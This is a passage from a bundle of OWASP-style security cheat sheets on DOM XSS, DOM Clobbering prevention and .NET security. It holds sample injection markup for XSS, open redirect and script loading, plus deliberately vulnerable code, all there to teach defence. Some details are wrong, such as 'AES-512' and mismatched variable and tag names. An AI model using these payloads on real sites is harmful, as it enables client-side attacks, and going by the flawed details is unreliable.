in certain contexts.\r\n\r\n### Usually Safe Methods\r\n\r\nOne example of an attribute which is thought to be safe is `innerText`.\r\n\r\nSome papers or guides advocate its use as an alternative to `innerHTML` to mitigate against XSS in `innerHTML`. However, depending on the tag which `innerText` is applied, code can be executed.\r\n\r\n```html\r\n<script>\r\n var tag = document.createElement(\"script\");\r\n tag.innerText = \"<%=untrustedData%>\";  //executes code\r\n</script>\r\n```\r\n\r\nThe `innerText` feature was originally introduced by Internet Explorer, and was formally specified in the HTML standard in 2016 after being adopted by all major browser vendors.\r\n\r\n### Detect DOM XSS using variant analysis\r\n\r\n**Vulnerable code:**\r\n\r\n```\r\n<script>\r\nvar x = location.hash.split(\"#\")[1];\r\ndocument.write(x);\r\n</script>\r\n```\r\n\r\nSemgrep rule to identify above dom xss [link](https://semgrep.dev/s/we30).\r\n"
    },
    {
      "DOM_Clobbering_Prevention_Cheat_Sheet.md": "# DOM Clobbering Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\n[DOM Clobbering](https://domclob.xyz/domc_wiki/#overview) is a type of code-reuse, HTML-only injection attack, where attackers confuse a web application by injecting HTML elements whose `id` or `name` attribute matches the name of security-sensitive variables or browser APIs, such as variables used for fetching remote content (e.g., script src), and overshadow their value.\r\n\r\nIt is particularly relevant when script injection is not possible, e.g., when filtered by HTML sanitizers, or mitigated by disallowing or controlling script execution. In these scenarios, attackers may still inject non-script HTML markups into webpages and transform the initially secure markup into executable code, achieving [Cross-Site Scripting (XSS)](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\r\n\r\n**This cheat sheet is a list of guidelines, secure coding patterns, and practices to prevent or restrict the impact of DOM Clobbering in your web application.**\r\n\r\n## Background\r\n\r\nBefore we dive into DOM Clobbering, let's refresh our knowledge with some basic Web background.\r\n\r\nWhen a webpage is loaded, the browser creates a [DOM tree](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction) that represents the structure and content of the page, and JavaScript code has read and write access to this tree.\r\n\r\nWhen creating the DOM tree, browsers also create an attribute for (some) named HTML elements on `window` and `document` objects. Named HTML elements are those having an `id` or `name` attribute. For example, the markup:\r\n\r\n```html\r\n<form id=x></a>\r\n```\r\n\r\nwill lead to browsers creating references to that form element with the attribute `x` of `window` and `document`:\r\n\r\n```js\r\nvar obj1 = document.getElementById('x');\r\nvar obj2 = document.x;\r\nvar obj3 = document.x;\r\nvar obj4 = window.x;\r\nvar obj5 = x; // by default, objects belong to the global Window, so x is same as window.x\r\nconsole.log(\r\n obj1 === obj2 && obj2 === obj3 &&\r\n obj3 === obj4 && obj4 === obj5\r\n); // true\r\n```\r\n\r\nWhen accessing an attribute of `window` and `document` objects, named HTML element references come before lookups of built-in APIs and other attributes on `window` and `document` that developers have defined, also known as [named property accesses](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object). Developers unaware of such behavior may use the content of window/document attributes for sensitive operations, such as URLs for fetching remote content, and attackers can exploit it by injecting markups with colliding names. Similarly to custom attributes/variables, built-in browser APIs may be overshadowed by DOM Clobbering.\r\n\r\nIf attackers are able to inject (non-script) HTML markup in the DOM tree,\r\nit can change the value of a variable that the web application relies on due to named property accesses, causing it to malfunction, expose sensitive data, or execute attacker-controlled scripts. DOM Clobbering works by taking advantage of this (legacy) behaviour, causing a namespace collision between the execution environment (i.e., `window` and `document` objects), and JavaScript code.\r\n\r\n### Example Attack 1\r\n\r\n```javascript\r\nlet redirectTo = window.redirectTo || '/profile/';\r\nlocation.assign(redirectTo);\r\n```\r\n\r\nThe attacker can:\r\n\r\n- inject the markup `<a id=redirectTo href='javascript:alert(1)'` and obtain XSS.\r\n- inject the markup `<a id=redirectTo href='phishing.com'` and obtain open redirect.\r\n\r\n### Example Attack 2\r\n\r\n```javascript\r\nvar script = document.createElement('script');\r\nlet src = window.config.url || 'script.js';\r\ns.src = src;\r\ndocument.body.appendChild(s);\r\n```\r\n\r\nThe attacker can inject the markup `<a id=config><a id=config name=url href='malicious.js'>` to load additional JavaScript code, and obtain arbitrary client-side code execution.\r\n\r\n## Summary of Guidelines\r\n\r\nFor quick reference, below is the summary of guidelines discussed next.\r\n\r\n|    | **Guidelines**                                                | Description                                                               |\r\n|----|---------------------------------------------------------------|---------------------------------------------------------------------------|\r\n| \\# 1  | Use HTML Sanitizers                                           | [link](#1-html-sanitization)                                              |\r\n| \\# 2  | Use Content-Security Policy                                   | [link](#2-content-security-policy)                                        |\r\n| \\# 3  | Freeze Sensitive DOM Objects                                  | [link](#3-freezing-sensitive-dom-objects)                                 |\r\n| \\# 4  | Validate All Inputs to DOM Tree                               | [link](#4-validate-all-inputs-to-dom-tree)                                |\r\n| \\# 5  | Use Explicit Variable Declarations                            | [link](#5-use-explicit-variable-declarations)                             |\r\n| \\# 6  | Do Not Use Document and Window for Global Variables           | [link](#6-do-not-use-document-and-window-for-global-variables)            |\r\n| \\# 7  | Do Not Trust Document Built-in APIs Before Validation         | [link](#7-do-not-trust-document-built-in-apis-before-validation)          |\r\n| \\# 8  | Enforce Type Checking                                         | [link](#8-enforce-type-checking)                                          |\r\n| \\# 9  | Use Strict Mode                                               | [link](#9-use-strict-mode)                                                |\r\n| \\# 10 | Apply Browser Feature Detection                               | [link](#10-apply-browser-feature-detection)                               |\r\n| \\# 11 | Limit Variables to Local Scope                                | [link](#11-limit-variables-to-local-scope)                                |\r\n| \\# 12 | Use Unique Variable Names In Production                       | [link](#12-use-unique-variable-names-in-production)                       |\r\n| \\# 13 | Use Object-oriented Programming Techniques like Encapsulation | [link](#13-use-object-oriented-programming-techniques-like-encapsulation) |\r\n\r\n## Mitigation Techniques\r\n\r\n### \\#1: HTML Sanitization\r\n\r\nRobust HTML sanitizers can prevent or restrict the risk of DOM Clobbering. They can do so in multiple ways. For example:\r\n\r\n- completely remove named properties like `id` and `name`. While effective, this may hinder the usability when named properties are needed for legitimate functionalties.\r\n- namespace isolation, which can be, for example, prefixing the value of named properties by a constant string to limit the risk of naming collisions.\r\n- dynamically checking if named properties of the input mark has collisions with the existing DOM tree, and if that is the case, then remove named properties of the input markup.\r\n\r\nOWASP recommends [DOMPurify](https://github.com/cure53/DOMPurify) or the [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) for HTML sanitization.\r\n\r\n#### DOMPurify Sanitizer\r\n\r\nBy default, DOMPurify removes all clobbering collisions with **built-in** APIs and properties (using the enabled-by-default `SANITIZE_DOM` configuration option). ]\r\n\r\nTo be protected against clobbering of custom variables and properties as well, you need to enable the `SANITIZE_NAMED_PROPS` config:\r\n\r\n```js\r\nvar clean = DOMPurify.sanitize(dirty, {SANITIZE_NAMED_PROPS: true});\r\n```\r\n\r\nThis would isolate the namespace of named properties and JavaScript variables by prefixing them with `user-content-` string.\r\n\r\n#### Sanitizer API\r\n\r\nThe new browser-built-in [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) does not prevent DOM Clobbering it its [default setting](https://wicg.github.io/sanitizer-api/#dom-clobbering), but can be configured to remove named properties:\r\n\r\n```js\r\nconst sanitizerInstance = new Sanitizer({\r\n  blockAttributes: [\r\n    {'name': 'id', elements: '*'},\r\n    {'name': 'name', elements: '*'}\r\n  ]\r\n});\r\ncontainerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});\r\n```\r\n\r\n### \\#2: Content-Security Policy\r\n\r\n[Content-Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) is a set of rules that tell the browser which resources are allowed to be loaded on a web page. By restricting the sources of JavaScript files (e.g., with the [script-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) directive), CSP can prevent malicious code from being injected into the page.\r\n\r\n**Note:** CSP can only mitigate **some varints** of DOM clobbering attacks, such as when attackers attempt to load new scripts by clobbering script sources, but not when already-present code can be abused for code execution, e.g., clobbering the parameters of code evaluation constructs like `eval()`.\r\n\r\n### \\#3: Freezing Sensitive DOM Objects\r\n\r\nA simple way to mitigate DOM Clobbering against individual objects could be to freeze sensitive DOM objects and their properties, e.g., via [Object.freeze()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze) method.\r\n\r\n**Note:** Freezing object properties prevents them from being overwritten by named DOM elements. But, determining all objects and object properties that need to be frozen may be not be easy, limiting the usefulness of this approach.\r\n\r\n## Secure Coding Guidelines\r\n\r\nDOM Clobbering can be avoided by defensive programming and adhering to a few coding patterns and guidelines.\r\n\r\n### \\#4: Validate All Inputs to DOM Tree\r\n\r\nBefore inserting any markup into the webpage's DOM tree, sanitize `id` and `name` attributes (see [HTML sanitization](#html-sanitization)).\r\n\r\n### \\#5: Use Explicit Variable Declarations\r\n\r\nWhen initializing varibles, always use a variable declarator like `var`, `let` or `const`, which prevents clobbering of the variable.\r\n\r\n**Note:** Declaring a variable with `let` does not create a property on `window`, unlike `var`. Therefore, `window.VARNAME` can still be clobbered (assuming `VARNAME` is the name of the variable).\r\n\r\n### \\#6: Do Not Use Document and Window for Global Variables\r\n\r\nAvoid using objects like `document` and `window` for storing global variables, because they can be easily manipulated. (see, e.g., [here](https://domclob.xyz/domc_wiki/indicators/patterns.html#do-not-use-document-for-global-variables)).\r\n\r\n### \\#7: Do Not Trust Document Built-in APIs Before Validation\r\n\r\nDocument properties, including built-in ones, are always overshadowed by DOM Clobbering, even right after they are assigned a value.\r\n\r\n**Hint:** This is due to the so-called [named property visibility algorithm](https://webidl.spec.whatwg.org/#legacy-platform-object-abstract-ops), where named HTML element references come before lookups of built-in APIs and other attributes on `document`.\r\n\r\n### \\#8: Enforce Type Checking\r\n\r\nAlways check the type of Document and Window properties before using them in sensitive operations, e.g., using the [instance of](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof) operator.\r\n\r\n**Hint:** When an object is clobbered, it would refer to an [HTMLElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) instance, which may not be the expected type.\r\n\r\n### \\#9: Use Strict Mode\r\n\r\nUse `strict` mode to prevent unintended global variable creation, and to [raise an error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Read-only) when read-only properties are attempted to be over-written.\r\n\r\n### \\#10: Apply Browser Feature Detection\r\n\r\nInstead of relying on browser-specific features or properties, use feature detection to determine whether a feature is supported before using it. This can help prevent errors and DOM Clobberng that might arise when using those features in unsupported browsers.\r\n\r\n**Hint:** Unsupported feature APIs can act as an undefined variable/property in unsupported browsers, making them clobberable.\r\n\r\n### \\#11: Limit Variables to Local Scope\r\n\r\nGlobal variables are more prone to being overwritten by DOM Clobberng. Whenever possible, use local variables and object properties.\r\n\r\n### \\#12: Use Unique Variable Names In Production\r\n\r\nUsing unique variable names may help prevent naming collisions that could lead to accidental overwrites.\r\n\r\n### \\#13: Use Object-oriented Programming Techniques like Encapsulation\r\n\r\nEncapsulating variables and functions within objects or classes can help prevent them from being overwritten. By making them private, they cannot be accessed from outside the object, making them less prone to DOM Clobbering.\r\n\r\n## References\r\n\r\n- [domclob.xyz](https://domclob.xyz)\r\n- [PortSwigger: DOM Clobbering Strikes Back](https://portswigger.net/research/dom-clobbering-strikes-back)\r\n- [Blogpost: XSS in GMail’s AMP4Email](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)\r\n- [HackTricks: DOM Clobbering](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)\r\n- [HTMLHell: DOM Clobbering](https://www.htmhell.dev/adventcalendar/2022/12/)\r\n"
    },
    {
      "DotNet_Security_Cheat_Sheet.md": "# DotNet Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis page intends to provide quick basic .NET security tips for developers.\r\n\r\n### The .NET Framework\r\n\r\nThe .NET Framework is Microsoft's principal platform for enterprise development. It is the supporting API for ASP.NET, Windows Desktop applications, Windows Communication Foundation services, SharePoint, Visual Studio Tools for Office and other technologies.\r\n\r\nThe .NET Framework constitutes a collection of APIs that facilitate the usage of an advanced type system, managing data, graphics, networking, file operations, and more - essentially covering the vast majority of requirements for developing enterprise applications within the Microsoft ecosystem. It is a nearly ubiquitous library that is strongly named and versioned at the assembly level.\r\n\r\n### Updating the Framework\r\n\r\nThe .NET Framework is kept up-to-date by Microsoft with the Windows Update service. Developers do not normally need to run separate updates to the Framework. Windows Update can be accessed at [Windows Update](http://windowsupdate.microsoft.com/) or from the Windows Update program on a Windows computer.\r\n\r\nIndividual frameworks can be kept up to date using [NuGet](https://docs.microsoft.com/en-us/nuget/). As Visual Studio prompts for updates, build it into your lifecycle.\r\n\r\nRemember that third-party libraries have to be updated separately and not all of them use NuGet. ELMAH for instance, requires a separate update effort.\r\n\r\n### Security Announcements\r\n\r\nReceive security notifications by selecting the \"Watch\" button at the following repositories:\r\n\r\n- [.NET Core Security Announcements](https://github.com/dotnet/announcements/issues?q=is%3Aopen+is%3Aissue+label%3ASecurity)\r\n- [ASP.NET Core & Entity Framework Core Security Announcements](https://github.com/aspnet/Announcements/issues?q=is%3Aopen+is%3Aissue+label%3ASecurity)\r\n\r\n## .NET General Guidance\r\n\r\nThis section contains general guidance for .NET applications.\r\nThis applies to all .NET applications, including ASP.NET, WPF, WinForms, and others.\r\n\r\nThe OWASP Top 10 lists the most prevalent and dangerous threats to web security in the world today and is reviewed every few years\r\nand updated with the latest threat data. This section of the cheat sheet is based on this list.\r\nYour approach to securing your web application should be to start at the top threat A1 below and work down;\r\nthis will ensure that any time spent on security will be spent most effectively and\r\ncover the top threats first and lesser threats afterwards. After covering the Top 10 it is generally advisable\r\nto assess for other threats or get a professionally completed Penetration Test.\r\n\r\n### A01 Broken Access Control\r\n\r\n#### Weak Account management\r\n\r\nEnsure cookies are sent with the HttpOnly flag set to prevent client side scripts from accessing the cookie:\r\n\r\n```csharp\r\nCookieHttpOnly = true,\r\n```\r\n\r\nReduce the time period a session can be stolen in by reducing session timeout and removing sliding expiration:\r\n\r\n```csharp\r\nExpireTimeSpan = TimeSpan.FromMinutes(60),\r\nSlidingExpiration = false\r\n```\r\n\r\nSee [here](https://github.com/johnstaveley/SecurityEssentials/blob/master/SecurityEssentials/App_Start/Startup.Auth.cs) for an example of a full startup code snippet.\r\n\r\nEnsure cookies are sent over HTTPS in production. This should be enforced in the config transforms:\r\n\r\n```xml\r\n<httpCookies requireSSL=\"true\" />\r\n<authentication>\r\n    <forms requireSSL=\"true\" />\r\n</authentication>\r\n```\r\n\r\nProtect LogOn, Registration and password reset methods against brute force attacks by throttling requests (see code below). Consider also using ReCaptcha.\r\n\r\n```csharp\r\n[HttpPost]\r\n[AllowAnonymous]\r\n[ValidateAntiForgeryToken]\r\n[AllowXRequestsEveryXSecondsAttribute(Name = \"LogOn\",\r\nMessage = \"You have performed this action more than {x} times in the last {n} seconds.\",\r\nRequests = 3, Seconds = 60)]\r\npublic async Task<ActionResult> LogOn(LogOnViewModel model, string returnUrl)\r\n```\r\n\r\nDO NOT: Roll your own authentication or session management. Use the one provided by .NET.\r\n\r\nDO NOT: Tell someone if the account exists on LogOn, Registration or Password reset. Say something like 'Either the username or password was incorrect', or 'If this account exists then a reset token will be sent to the registered email address'. This protects against account enumeration.\r\n\r\nThe feedback to the user should be identical whether or not the account exists, both in terms of content and behavior. E.g., if the response takes 50% longer when the account is real then membership information can be guessed and tested.\r\n\r\n#### Missing function-level access control\r\n\r\nDO: Authorize users on all externally facing endpoints. The .NET framework has many ways to authorize a user, use them at method level:\r\n\r\n```csharp\r\n[Authorize(Roles = \"Admin\")]\r\n[HttpGet]\r\npublic ActionResult Index(int page = 1)\r\n```\r\n\r\nor better yet, at controller level:\r\n\r\n```csharp\r\n[Authorize]\r\npublic class UserController\r\n```\r\n\r\nYou can also check roles in code using identity features in .net: `System.Web.Security.Roles.IsUserInRole(userName, roleName)`\r\n\r\nYou can find more information in the [Authorization Cheat Sheet](Authorization_Cheat_Sheet.md) and\r\n[Authorization Testing Automation Cheat Sheet](Authorization_Testing_Automation_Cheat_Sheet.md).\r\n\r\n#### Insecure Direct object references\r\n\r\nWhen you have a resource (object) which can be accessed by a reference (in the sample below this is the `id`), you need to ensure that the user is intended to have access to that resource.\r\n\r\n```csharp\r\n// Insecure\r\npublic ActionResult Edit(int id)\r\n{\r\n  var user = _context.Users.FirstOrDefault(e => e.Id == id);\r\n  return View(\"Details\", new UserViewModel(user);\r\n}\r\n\r\n// Secure\r\npublic ActionResult Edit(int id)\r\n{\r\n  var user = _context.Users.FirstOrDefault(e => e.Id == id);\r\n  // Establish user has right to edit the details\r\n  if (user.Id != _userIdentity.GetUserId())\r\n  {\r\n        HandleErrorInfo error = new HandleErrorInfo(\r\n            new Exception(\"INFO: You do not have permission to edit these details\"));\r\n        return View(\"Error\", error);\r\n  }\r\n  return View(\"Edit\", new UserViewModel(user);\r\n}\r\n```\r\n\r\nMore information can be found in the [Insecure Direct Object Reference Prevention Cheat Sheet](Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.md).\r\n\r\n### A02 Cryptographic Failures\r\n\r\n#### General cryptography guidance\r\n\r\n- **Never, ever write your own cryptographic functions.**\r\n- Wherever possible, try and avoid writing any cryptographic code at all. Instead try and either use pre-existing secrets management solutions or the secret management solution provided by your cloud provider. For more information, see the [OWASP Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md).\r\n- If you cannot use a pre-existing secrets management solution, try and use a trusted and well known implementation library rather than using the libraries built into .NET as it is far too easy to make cryptographic errors with them.\r\n- Make sure your application or protocol can easily support a future change of cryptographic algorithms.\r\n\r\n#### Hashing\r\n\r\nDO: Use a strong hashing algorithm.\r\n\r\n- In .NET (both Framework and Core), the strongest hashing algorithm for general hashing requirements is\r\n  [System.Security.Cryptography.SHA512](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.sha512).\r\n- In .NET Framework 4.6 and earlier, the strongest algorithm for password hashing is PBKDF2, implemented as\r\n  [System.Security.Cryptography.Rfc2898DeriveBytes](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rfc2898derivebytes).\r\n- In .NET Framework 4.6.1 and later and .NET Core, the strongest algorithm for password hashing is PBKDF2, implemented as\r\n  [Microsoft.AspNetCore.Cryptography.KeyDerivation.Pbkdf2](https://docs.microsoft.com/en-us/aspnet/core/security/data-protection/consumer-apis/password-hashing)\r\n  which has several significant advantages over `Rfc2898DeriveBytes`.\r\n- When using a hashing function to hash non-unique inputs such as passwords, use a salt value added to the original value before hashing.\r\n- Refer to the [Password Storage Cheat Sheet](Password_Storage_Cheat_Sheet.md) for more information.\r\n\r\n#### Passwords\r\n\r\nDO: Enforce passwords with a minimum complexity that will survive a dictionary attack; i.e. longer passwords that use the full character set (numbers, symbols and letters) to increase entropy.\r\n\r\n#### Encryption\r\n\r\nDO: Use a strong encryption algorithm such as AES-512 where personally identifiable data needs to be restored to it's original format.\r\n\r\nDO: Protect encryption keys more than any other asset. Find more information about storing encryption keys at rest in the\r\n  [Key Management Cheat Sheet](Key_Management_Cheat_Sheet.md#storage).\r\n\r\nDO: Use TLS 1.2+ for your entire site. Get a free certificate [LetsEncrypt.org](https://letsencrypt.org/) and automate renewals.\r\n\r\nDO NOT: [Allow SSL, this is now obsolete](https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices).\r\n\r\nDO: Have a strong TLS policy (see [SSL Best Practices](https://www.ssllabs.com/projects/best-practices/index.html)), use TLS 1.2+ wherever possible. Then check the configuration using [SSL Test](https://www.ssllabs.com/ssltest/) or [TestSSL](https://testssl.sh/).\r\n\r\nMore information on Transport Layer Protection can be found in the\r\n[Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md).\r\n\r\nDO: Ensure headers are not disclosing information about your application. See [HttpHeaders.cs](https://github.com/johnstaveley/SecurityEssentials/blob/master/SecurityEssentials/Core/HttpHeaders.cs), [Dionach StripHeaders](https://github.com/Dionach/StripHeaders/), disable via `web.config` or [Startup.cs](https://medium.com/bugbountywriteup/security-headers-1c770105940b).\r\n\r\ne.g Web.config\r\n\r\n```xml\r\n<system.web>\r\n    <httpRuntime enableVersionHeader=\"false\"/>\r\n</system.web>\r\n<system.webServer>\r\n    <security>\r\n        <requestFiltering removeServerHeader=\"true\" />\r\n    </security>\r\n    <httpProtocol>\r\n        <customHeaders>\r\n            <add name=\"X-Content-Type-Options\" value=\"nosniff\" />\r\n            <add name=\"X-Frame-Options\" value=\"DENY\" />\r\n            <add name=\"X-Permitted-Cross-Domain-Policies\" value=\"master-only\"/>\r\n            <add name=\"X-XSS-Protection\" value=\"0\"/>\r\n            <remove name=\"X-Powered-By\"/>\r\n        </customHeaders>\r\n    </httpProtocol>\r\n</system.webServer>\r\n```\r\n\r\ne.g Startup.cs\r\n\r\n``` csharp\r\napp.UseHsts(hsts => hsts.MaxAge(365).IncludeSubdomains());\r\napp.UseXContentTypeOptions();\r\napp.UseReferrerPolicy(opts => opts.NoReferrer());\r\napp.UseXXssProtection(options => options.FilterDisabled());\r\napp.UseXfo(options => options.Deny());\r\n\r\napp.UseCsp(opts => opts\r\n .BlockAllMixedContent()\r\n .StyleSources(s => s.Self())\r\n .StyleSources(s => s.UnsafeInline())\r\n .FontSources(s => s.Self())\r\n .FormActions(s => s.Self())\r\n .FrameAncestors(s => s.Self())\r\n .ImageSources(s => s.Self())\r\n .ScriptSources(s => s.Self())\r\n );\r\n```\r\n\r\nMore information about headers can be found at the [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/).\r\n\r\n#### Encryption for storage\r\n\r\n- Use the [Windows Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) for secure local storage of sensitive data.\r\n- Where DPAPI cannot be used, follow the algorithm guidance in the [OWASP Cryptographic Storage Cheat Sheet](Cryptographic_Storage_Cheat_Sheet.md#algorithms).\r\n\r\nThe following code snippet shows an example of using AES-GCM to perform encryption/decryption of data. It is strongly recommended to have a cryptography expert review your final design and code, as even the most trivial error can severely weaken your encryption.\r\n\r\nThe code is based on example from here: [https://www.scottbrady91.com/c-sharp/aes-gcm-dotnet](https://www.scottbrady91.com/c-sharp/aes-gcm-dotnet)\r\n\r\nA few constraints/pitfalls with this code:\r\n\r\n- It does not take into account key rotation or management which is a whole topic in itself.\r\n- It is important to use a different nonce for every encryption operation, even if the same key is used.\r\n- The key will need to be stored securely.\r\n\r\n<details>\r\n  <summary>Click here to view the \"AES-GCM symmetric encryption\" code snippet.</summary>\r\n  \r\n```csharp\r\n// Code based on example from here:\r\n// https://www.scottbrady91.com/c-sharp/aes-gcm-dotnet\r\n\r\npublic class AesGcmSimpleTest\r\n{\r\n    public static void Main()\r\n    {\r\n\r\n        // Key of 32 bytes / 256 bits for AES\r\n        var key = new byte[32];\r\n        RandomNumberGenerator.Fill(key);\r\n\r\n        // MaxSize = 12 bytes / 96 bits and this size should always be used.\r\n        var nonce = new byte[AesGcm.NonceByteSizes.MaxSize];\r\n        RandomNumberGenerator.Fill(nonce);\r\n\r\n        // Tag for authenticated encryption\r\n        var tag = new byte[AesGcm.TagByteSizes.MaxSize];\r\n\r\n        var message = \"This message to be encrypted\";\r\n        Console.WriteLine(message);\r\n\r\n        // Encrypt the message\r\n        var cipherText = AesGcmSimple.Encrypt(message, nonce, out tag, key);\r\n        Console.WriteLine(Convert.ToBase64String(cipherText));\r\n\r\n        // Decrypt the message\r\n        var message2 = AesGcmSimple.Decrypt(cipherText, nonce, tag, key);\r\n        Console.WriteLine(message2);\r\n\r\n\r\n    }\r\n}\r\n\r\n\r\npublic static class AesGcmSimple\r\n{\r\n\r\n    public static byte[] Encrypt(string plaintext, byte[] nonce, out byte[] tag, byte[] key)\r\n    {\r\n        using(var aes = new AesGcm(key))\r\n        {\r\n            // Tag for authenticated encryption\r\n            tag = new byte[AesGcm.TagByteSizes.MaxSize];\r\n            \r\n            // Create a byte array from the message to encrypt\r\n            var plaintextBytes = Encoding.UTF8.GetBytes(plaintext);\r\n            \r\n            // Ciphertext will be same length in bytes as plaintext \r\n            var ciphertext = new byte[plaintextBytes.Length];\r\n            \r\n            // perform the actual encryption\r\n            aes.Encrypt(nonce, plaintextBytes, ciphertext, tag);\r\n            return ciphertext;\r\n        }\r\n    }\r\n\r\n    public static string Decrypt(byte[] ciphertext, byte[] nonce, byte[] tag, byte[] key)\r\n    {\r\n        using(var aes = new AesGcm(key))\r\n        {\r\n            // Plaintext will be same length in bytes as Ciphertext \r\n            var plaintextBytes = new byte[ciphertext.Length];\r\n            \r\n            // perform the actual decryption\r\n            aes.Decrypt(nonce, ciphertext, tag, plaintextBytes);\r\n                        \r\n            return Encoding.UTF8.GetString(plaintextBytes);\r\n        }\r\n    }\r\n}\r\n\r\n```\r\n\r\n</details>\r\n\r\n#### Encryption for transmission\r\n\r\n- Again, follow the algorithm guidance in the [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#algorithms).\r\n\r\nThe following code snippet shows an example of using Eliptic Curve/Diffie Helman (ECDH) together with AES-GCM to perform encryption/decryption of data between two different sides without the need the transfer the symmetric key between the two sides. Instead, the sides exchange public keys and can then use ECDH to generate a shared secret which can be used for the symmetric encryption.\r\n\r\nAgain, it is strongly recommended to have a cryptography expert review your final design and code, as even the most trivial error can severely weaken your encryption.\r\n\r\nNote that this code sample relies on the `AesGcmSimple` class from the [previous section](#encryption-for-storage).\r\n\r\nA few constraints/pitfalls with this code:\r\n\r\n- It does not take into account key rotation or management which is a whole topic in itself.\r\n- The code deliberately enforces a new nonce for every encryption operation but this must be managed as a separate data item alongside the ciphertext.\r\n- The private keys will need to be stored securely.\r\n- The code does not consider the validation of public keys before use.\r\n- Overall, there is no verification of authenticity between the two sides.\r\n\r\n<details>\r\n  <summary>Click here to view the \"ECDH asymmetric encryption\" code snippet.</summary>\r\n\r\n```csharp\r\npublic class ECDHSimpleTest\r\n{\r\n    public static void Main()\r\n    {\r\n        // Generate ECC key pair for Alice\r\n        var alice = new ECDHSimple();\r\n        byte[] alicePublicKey = alice.PublicKey;\r\n\r\n        // Generate ECC key pair for Bob\r\n        var bob = new ECDHSimple();\r\n        byte[] bobPublicKey = bob.PublicKey;\r\n\r\n        string plaintext = \"Hello, Bob! How are you?\";\r\n        Console.WriteLine(\"Secret being sent from Alice to Bob: \" + plaintext);\r\n\r\n        // Note that a new nonce is generated with every encryption operation in line with\r\n        // in line with the AES GCM security \r\n        byte[] tag;\r\n        byte[] nonce;\r\n        var cipherText = alice.Encrypt(bobPublicKey, plaintext, out nonce, out tag);\r\n        Console.WriteLine(\"Ciphertext, nonce, and tag being sent from Alice to Bob: \" + Convert.ToBase64String(cipherText) + \" \" + Convert.ToBase64String(nonce) + \" \" + Convert.ToBase64String(tag));\r\n\r\n        var decrypted = bob.Decrypt(alicePublicKey, cipherText, nonce, tag);\r\n        Console.WriteLine(\"Secret received by Bob from Alice: \" + decrypted);\r\n\r\n        Console.WriteLine();\r\n\r\n        string plaintext2 = \"Hello, Alice! I'm good, how are you?\";\r\n        Console.WriteLine(\"Secret being sent from Bob to Alice: \" + plaintext2);\r\n\r\n        byte[] tag2;\r\n        byte[] nonce2;\r\n        var cipherText2 = bob.Encrypt(alicePublicKey, plaintext2, out nonce2, out tag2);\r\n        Console.WriteLine(\"Ciphertext, nonce, and tag being sent from Bob to Alice: \" + Convert.ToBase64String(cipherText2) + \" \" + Convert.ToBase64String(nonce2) + \" \" + Convert.ToBase64String(tag2));\r\n\r\n        var decrypted2 = alice.Decrypt(bobPublicKey, cipherText2, nonce2, tag2);\r\n        Console.WriteLine(\"Secret received by Alice from Bob: \" + decrypted2);\r\n    }\r\n}\r\n\r\n\r\npublic class ECDHSimple\r\n{\r\n\r\n    private ECDiffieHellmanCng ecdh = new ECDiffieHellmanCng();\r\n\r\n    public byte[] PublicKey\r\n    {\r\n        get\r\n        {\r\n            return ecdh.PublicKey.ToByteArray();\r\n        }\r\n    }\r\n\r\n    public byte[] Encrypt(byte[] partnerPublicKey, string message, out byte[] nonce, out byte[] tag)\r\n    {\r\n        // Generate the AES Key and Nonce\r\n        var aesKey = GenerateAESKey(partnerPublicKey);\r\n\r\n        // Tag for authenticated encryption\r\n        tag = new byte[AesGcm.TagByteSizes.MaxSize];\r\n        \r\n        // MaxSize = 12 bytes / 96 bits and this size should always be used.\r\n        // A new nonce is generated with every encryption operation in line with\r\n        // the AES GCM security model\r\n        nonce = new byte[AesGcm.NonceByteSizes.MaxSize];\r\n        RandomNumberGenerator.Fill(nonce);\r\n\r\n        // return the encrypted value\r\n        return AesGcmSimple.Encrypt(message, nonce, out tag, aesKey);\r\n    }\r\n\r\n\r\n    public string Decrypt(byte[] partnerPublicKey, byte[] ciphertext, byte[] nonce, byte[] tag)\r\n    {\r\n        // Generate the AES Key and Nonce\r\n        var aesKey = GenerateAESKey(partnerPublicKey);\r\n\r\n        // return the decrypted value\r\n        return AesGcmSimple.Decrypt(ciphertext, nonce, tag, aesKey);\r\n    }\r\n\r\n    private byte[] GenerateAESKey(byte[] partnerPublicKey)\r\n    {\r\n        // Derive the secret based on this side's private key and the other side's public key \r\n        byte[] secret = ecdh.DeriveKeyMaterial(CngKey.Import(partnerPublicKey, CngKeyBlobFormat.EccPublicBlob));\r\n        \r\n        byte[] aesKey = new byte[32]; // 256-bit AES key\r\n        Array.Copy(secret, 0, aesKey, 0, 32); // Copy first 32 bytes as the key\r\n        \r\n        return aesKey;\r\n    }\r\n}\r\n```\r\n\r\n</details>\r\n\r\n### A03 Injection\r\n\r\n#### SQL Injection\r\n\r\nDO: Using an object relational mapper (ORM) or stored procedures is the most 